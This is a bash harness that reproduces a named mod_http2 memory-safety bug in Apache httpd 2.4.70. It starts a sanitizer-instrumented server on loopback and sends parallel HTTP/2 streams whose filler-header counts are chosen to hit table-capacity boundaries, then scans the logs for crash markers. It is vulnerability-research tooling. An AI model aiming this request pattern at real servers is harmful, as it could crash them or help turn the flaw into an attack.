#!/usr/bin/env bash
# Capacity-boundary race harness for CVE-2026-119618 (mod_http2 assign_headers).
#
# The vulnerable line is apr_table_setn(req->headers, "Content-Length", "0")
# in h2_request.c:358 (httpd 2.4.70).  req->headers is created with
# apr_table_make(pool, 10); APR doubles capacity 10->20->40->80->160.
# apr_table_setn -> apr_table_addn -> apr_array_push only calls apr_palloc
# (on the c1-owned stream pool) when nelts == nalloc.  Frontier's 65 filler
# headers left ~12 free slots in an 80-slot table, so the write was in-place
# and never touched the allocator.  This harness chooses filler counts that
# put the table exactly on a capacity boundary.
#
# Loopback only.  Uses the inherited ASan/UBSan builds under
# lab/frontier/apache2root; no external probes, no target-list mode.
set -o pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/../.." && pwd)"
BASE="$REPO/lab/frontier/apache2root"
mkdir -p "$HERE/logs" "$HERE/run"

V="${V:-2.4.70}"
PORT="${PORT:-7180}"
STREAMS="${STREAMS:-120}"
PAR="${PAR:-1}"                      # curl --parallel-max: 1 => one h2 session
ROUND_LOGLEVEL="${ROUND_LOGLEVEL:-http2:trace1}"
FILLERS="${FILLERS:-6 7 16 17 36 37 76 77 156 157}"
PREFIX="$BASE/install-$V-asan"
CONF="$HERE/run/httpd-$V-$PORT.conf"
PIDF="$HERE/run/httpd-$V-$PORT.pid"
ERR="$HERE/logs/error-$V-$PORT.log"
SUMMARY="$HERE/logs/summary-$V-$PORT.txt"
ASANPFX="$HERE/logs/asan-$V-$PORT"

MODS="authn_core authz_core authz_host unixd mime log_config logio headers dir alias reqtimeout setenvif filter http2 cgi version"

conf_for() {
  {
    echo "ServerRoot \"$PREFIX\""
    echo "PidFile \"$PIDF\""
    echo "Listen 127.0.0.1:$PORT"
    for m in $MODS; do echo "LoadModule ${m}_module modules/mod_${m}.so"; done
    echo "ServerName localhost"
    echo "ErrorLog \"$ERR\""
    echo "LogLevel $ROUND_LOGLEVEL"
    echo 'LogFormat "%h %l %u %t \"%r\" %>s %b" common'
    echo "CustomLog \"$HERE/logs/access-$V-$PORT.log\" common"
    echo "Protocols h2c http/1.1"
    echo "H2Direct on"
    echo "H2MaxSessionStreams 400"
    echo "DocumentRoot \"$BASE/htdocs\""
    echo "<Directory \"$BASE/htdocs\">"
    echo "    Require all granted"
    echo "</Directory>"
    echo "ScriptAlias /cgi-bin/ \"$BASE/cgi-bin/\""
    echo "<Directory \"$BASE/cgi-bin\">"
    echo "    Require all granted"
    echo "    Options +ExecCGI"
    echo "    SetHandler cgi-script"
    echo "</Directory>"
  } > "$CONF"
}

start_server() {
  conf_for
  : > "$ERR"
  ASAN_OPTIONS="detect_leaks=0:halt_on_error=1:log_path=$ASANPFX" \
  UBSAN_OPTIONS="print_stacktrace=1" \
    "$PREFIX/bin/httpd" -f "$CONF" -DFOREGROUND \
    > "$HERE/logs/stdout-$V-$PORT.log" 2>&1 &
  HPID=$!
  for i in $(seq 1 80); do
    if curl -sS --max-time 1 -o /dev/null "http://127.0.0.1:$PORT/index.html" 2>/dev/null; then
      echo "ready $V on 127.0.0.1:$PORT (pid $HPID)"
      return 0
    fi
    sleep 0.25
  done
  echo "FAILED to start $V; see $HERE/logs/stdout-$V-$PORT.log"
  return 1
}

stop_server() {
  kill "$HPID" 2>/dev/null || true
  wait "$HPID" 2>/dev/null || true
}

check_markers() {
  local n="$1"
  local found
  found=$(grep -Ei 'AddressSanitizer|runtime error|SEGV|segmentation|child pid.*exit|AH0.*(crash|abort)' "$ERR" 2>/dev/null | tail -20 || true)
  if [ -n "$found" ]; then
    { echo "--- fillers=$n ---"; echo "$found"; } >> "$SUMMARY"
    echo "$found"
  fi
  if [ "${KEEP_ERR:-0}" = "1" ]; then
    cp "$ERR" "$HERE/logs/err-$V-$PORT-n$n.log"
  fi
  : > "$ERR"
}

echo "== capacity-boundary sweep: V=$V port=$PORT streams=$STREAMS parallel-max=$PAR loglevel=$ROUND_LOGLEVEL =="
echo "== fillers: $FILLERS =="
rm -f "$ASANPFX".* "$SUMMARY"
start_server || exit 1
trap stop_server EXIT

for n in $FILLERS; do
  hdrs=(-H 'Content-Type: text/plain')
  for i in $(seq 1 "$n"); do hdrs+=(-H "X-F-$i: v$i"); done
  urls=()
  for i in $(seq 1 "$STREAMS"); do urls+=("http://127.0.0.1:$PORT/index.html?n=$n&s=$i"); done
  curl --http2-prior-knowledge --parallel --parallel-immediate \
    --parallel-max "$PAR" --max-time 60 -sS -o /dev/null \
    "${hdrs[@]}" "${urls[@]}" >/dev/null 2>&1
  rc=$?
  echo "fillers=$n curl_rc=$rc"
  check_markers "$n"
done

sleep 1
echo "== ASan/UBSan report files =="
ls -l "$ASANPFX".* 2>/dev/null || echo "(none)"
echo "== accumulated crash markers =="
cat "$SUMMARY" 2>/dev/null || echo "(none)"
